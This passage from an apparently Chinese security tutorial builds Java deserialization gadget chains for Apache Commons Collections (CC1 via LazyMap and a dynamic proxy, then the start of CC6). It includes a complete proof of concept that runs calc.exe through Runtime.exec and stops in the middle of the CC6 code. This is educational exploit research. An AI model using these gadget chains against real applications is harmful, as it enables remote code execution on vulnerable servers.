class="hljs-string">&quot;提交事务&quot;</span>);<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                    &#125;<br>                &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>测试类：TestProxy</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.proxy;<br><br><span class="hljs-keyword">import</span> org.junit.Test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestProxy</span> &#123;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testDynamicProxy</span> <span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">IUserDao</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserDao</span>();<br>        System.out.println(target.getClass());  <span class="hljs-comment">//输出目标对象信息</span><br>        <span class="hljs-type">IUserDao</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (IUserDao) <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyFactory</span>(target).getProxyInstance();<br>        System.out.println(proxy.getClass());  <span class="hljs-comment">//输出代理对象信息</span><br>        proxy.save();  <span class="hljs-comment">//执行代理方法</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>输出结果</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">class com.proxy.UserDao<br>class com.sun.proxy.<span class="hljs-variable">$Proxy4</span><br>开启事务<br>保存数据<br>提交事务<br></code></pre></td></tr></table></figure><h4 id="再来看看源代码"><a href="#再来看看源代码" class="headerlink" title="再来看看源代码"></a>再来看看源代码</h4><p>作为一门静态语言，如果想劫持一个对象内部的方法调用，实现类似PHP的魔术方法 <code>__call</code> ，我们需要用到 <code>java.reflect.Proxy</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span><br><span class="hljs-title class_">Class</span>[] &#123;Map.class&#125;, handler);<br></code></pre></td></tr></table></figure><p><code>Proxy.newProxyInstance</code> 的第一个参数是ClassLoader，我们用默认的即可；第二个参数是我们需要代理的对象集合；第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻辑。</p><p>比如，我们写这样一个类<code>ExampleInvocationHandler</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExampleInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    <span class="hljs-keyword">protected</span> Map map;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ExampleInvocationHandler</span><span class="hljs-params">(Map map)</span>&#123;<br>        <span class="hljs-built_in">this</span>.map=map;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><span class="hljs-comment">//这个是重写InvocationHandler的时候出现的，用来决定代理需要的</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-keyword">if</span> (method.getName().compareTo(<span class="hljs-string">&quot;get&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;hook method &quot;</span>+method.getName());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hacked Object&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-built_in">this</span>.map,args);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>ExampleInvocationHandler</code>类实现了invoke方法，作用是在监控到调用的方法名是get的时候，返回一个特殊字符串 Hacked Object 。</p><p>调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExampleInvocationHandler</span>(<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">HashMap</span>());<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map)<br>                Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Map.class&#125;,<br>                        handler);<br>        proxyMap.put(<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;world&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> (String) proxyMap.get(<span class="hljs-string">&quot;hello&quot;</span>);<br>        System.out.println(result);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行App，我们可以发现，虽然我向Map放入的hello值为world，但我们获取到的结果却是 HackedObject ：</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191224015.png" alt="image-20230129150405833"> </p><p>我们回看 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> ，会发现实际上这个类实际就是一个<code>InvocationHandler</code>，我们如果将这个对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到 <code>AnnotationInvocationHandler#invoke</code> 方法中，进而触发我们的<code>LazyMap#get</code> 。</p><h3 id="使用LazyMap构造利用链"><a href="#使用LazyMap构造利用链" class="headerlink" title="使用LazyMap构造利用链"></a>使用LazyMap构造利用链</h3><p>所以，在上一章TransformedMap POC的基础上进行修改，首先使用LazyMap替换TransformedMap</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">Map</span> outerMap = LazyMap.decorate(innerMap, transformerChain);<br></code></pre></td></tr></table></figure><p>然后再对<code>sun.reflect.annotation.AnnotationInvocationHandler</code>这个对象进行Proxy</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Map.class&#125;, handler);<br></code></pre></td></tr></table></figure><blockquote><p>这里的newInstance的意思是这样的</p><ul><li><p>创建类的对象：调用Class对象的newInstance()方法</p><ul><li>类必须有一个无参数的构造器。</li><li>类的构造器的访问权限需要足够</li></ul></li><li><p>思考？难道没有无参的构造器就不能创建对象了吗？只要在操作的时候明确的调用类中的构造器，并将参数传递进去之后，才可以实例化操作</p></li><li><p>步骤如下</p><ul><li>通过Class类的getDeclaredConstructor(Class … parameterTypes)取得本类的指定形参类型的构造器</li><li>向构造器的形参中传递一个对象数组进去，里面包含了构造器中所需的各个参数。</li><li>通过Constructor实例化对象</li></ul></li></ul><p><strong>下面是一些示例：</strong></p><p>对于不带参数的public类型的Class，我们可以直接对其创建实例，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">String s = String.<span class="hljs-keyword">class</span>.<span class="hljs-title function_ invoke__">newInstance</span>();<br></code></pre></td></tr></table></figure><p>但对于带参数的Class，需要调用其带任意参数的构造方法，必须借助于Constructor对象</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp">Constructor cons1 = Child.<span class="hljs-keyword">class</span>.getConstructor(String.<span class="hljs-keyword">class</span>,<span class="hljs-built_in">int</span>.<span class="hljs-keyword">class</span>);<br>Child kid = (Child) cons1.newInstance(<span class="hljs-string">&quot;testName&quot;</span>,<span class="hljs-number">60</span>);<br>System.<span class="hljs-keyword">out</span>.println(kid.name);<br></code></pre></td></tr></table></figure><ol><li>首先获取该对象的构造方法</li><li>对该构造方法调用newInstance并传入特定参数，创建实例成功</li><li>Constructor有getConstructor(Class)、getDeclaredConstructor(Class)、getConstructors()、getDeclaredConstructors()，使用方法类似，不再赘述</li></ol></blockquote><p>代理后的对象叫做proxyMap，但我们不能直接对其进行序列化，因为我们入口点是<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code> ，所以我们还需要再用<code>AnnotationInvocationHandler</code>对这个proxyMap进行包裹：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">handler = (InvocationHandler) construct.newInstance(Retention.class,<br>proxyMap);<span class="hljs-comment">//使用Java的反射机制创建一个新的实例对象</span><br></code></pre></td></tr></table></figure><blockquote><p>为什么可以强转(InvocationHandler) </p><p><code>AnnotationInvocationHandler</code> 实现了 <code>InvocationHandler</code> 接口，所以该对象可以强制转换为 <code>InvocationHandler</code> 类型，以便作为参数传递给后面的代码。</p></blockquote><p>修改完后的完整的代码如下所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections1_p</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;C:/Windows/System32/calc.exe&quot;</span> &#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        innerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">construct</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<span class="hljs-comment">//通过构造器创建带参数的class对象对象</span><br>        construct.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler)construct.newInstance(Retention.class, outerMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">Class</span>[] &#123;Map.class&#125;, handler);<br>        handler=(InvocationHandler) construct.newInstance(Retention.class,proxyMap);<br><br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(handler);<br>        oos.close();<br><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191224605.png" alt="image-20230201202800276"> </p><p>成功弹出计算器</p><p>但是有一个缺点是LazyMap和TransformedMap一样都不能解决高版本利用的问题，接下来就来解决这个问题</p><h2 id="解决高版本的利用问题-CC6"><a href="#解决高版本的利用问题-CC6" class="headerlink" title="解决高版本的利用问题(CC6)"></a>解决高版本的利用问题(CC6)</h2><h3 id="寻找利用链"><a href="#寻找利用链" class="headerlink" title="寻找利用链"></a>寻找利用链</h3><p>因为<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code> 的逻辑变化，所以高版本的并不能够利用</p><p>以下是p神简化的CC1利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> Gadget chain:</span><br><span class="hljs-comment"> java.io.ObjectInputStream.readObject()</span><br><span class="hljs-comment"> java.util.HashMap.readObject()</span><br><span class="hljs-comment"> java.util.HashMap.hash()</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="hljs-comment"> org.apache.commons.collections.map.LazyMap.get()</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="hljs-comment"> java.lang.reflect.Method.invoke()</span><br><span class="hljs-comment"> java.lang.Runtime.exec()</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>我们需要看的主要是从最开始到 <code>org.apache.commons.collections.map.LazyMap.get()</code> 的那⼀部分，因为 <code>LazyMap#get</code> 后⾯的部分在上⼀篇⽂章⾥已经说了。所以简单来说，解决Java⾼版本利⽤问题，实际上就是在找上下⽂中是否还有其他调⽤ <code>LazyMap#get()</code> 的地⽅ </p><blockquote><p>关于这里为什么要找get()的原因</p><p>LazyMap是在其get方法中执行的 factory.transform 。其实这也好理解，LazyMap的作用是“懒加载”，在get找不到值的时候，它会调用 factory.transform 方法去获取一个值：</p></blockquote><p>我们找到的类是<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code>,在其<code>getValue</code>⽅法中调⽤了 <code>this.map.get</code> ，⽽其<code>hashCode</code>⽅法调⽤了<code>getValue</code>⽅法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> org.apache.commons.collections.keyvalue;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.KeyValue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntry</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>.Entry, KeyValue, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">8453869361373831205L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object key;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> &#123;<br>        <span class="hljs-built_in">this</span>.map = map;<br>        <span class="hljs-built_in">this</span>.key = key;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getKey</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.key;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.map.get(<span class="hljs-built_in">this</span>.key);<br>    &#125;<br><br><span class="hljs-comment">//...</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getValue();<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">this</span>.getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : <span class="hljs-built_in">this</span>.getKey().hashCode()) ^ (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode());<br>    &#125;<br><br><span class="hljs-comment">//...</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>所以需要去找到哪里调用了<code>TiedMapEntry#hashCode</code></p><p>ysoserial中，是利⽤ <code>java.util.HashSet#readObject</code> 到 <code>HashMap#put()</code> 到 <code>HashMap#hash(key)</code>最后到 <code>TiedMapEntry#hashCode()</code> 。</p><p>实际上我发现，在 <code>java.util.HashMap#readObject</code> 中就可以找到 <code>HashMap#hash()</code> 的调⽤，去掉了最前⾯的两次调⽤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashMap</span>&lt;K,V&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMap</span>&lt;K,V&gt;<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>&lt;K,V&gt;, Cloneable, Serializable &#123;<br>        <br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">int</span> h;<br>        <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>    &#125;<br>     <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br></code></pre></td></tr></table></figure><p>在HashMap的readObject⽅法中，调⽤到了 <code>hash(key)</code> ，⽽hash⽅法中，调⽤到了<code>key.hashCode()</code> 。所以，我们只需要让这个key等于<code>TiedMapEntry</code>对象，即可连接上前⾯的分析过程，构成⼀个完整的Gadget</p><h3 id="构建Gadget代码"><a href="#构建Gadget代码" class="headerlink" title="构建Gadget代码"></a>构建Gadget代码</h3><p>先构造恶意LazyMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>    <span 